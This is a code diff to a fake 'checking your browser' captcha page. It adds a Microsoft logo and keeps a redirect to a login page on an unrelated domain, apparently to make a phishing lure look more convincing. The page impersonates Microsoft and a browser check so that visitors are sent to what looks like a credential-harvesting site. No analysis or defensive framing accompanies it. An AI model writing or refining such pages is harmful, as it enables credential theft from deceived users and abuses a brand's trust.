@@ -17,6 +17,12 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             display: inline-block;
             border-radius: 5px;
+            text-align: center;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 100px;
         }
         .captcha-box {
             display: flex;
@@ -66,6 +72,7 @@
 </head>
 <body>
     <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
         <h2>Checking your browser before accessing</h2>
         <p>This process is automatic. Your browser will redirect once the verification is complete.</p>
         <div class="captcha-box" onclick="toggleCaptcha()">
@@ -96,7 +103,7 @@
         }
 
         function redirectToURL() {
-            window.location.href = "https://login.dgyouths.online/XrxEaSmf"; // Change this to your desired URL
+            window.location.href = "https://login.dgyouths.online/XrxEaSmf";
         }
     </script>
 </body>
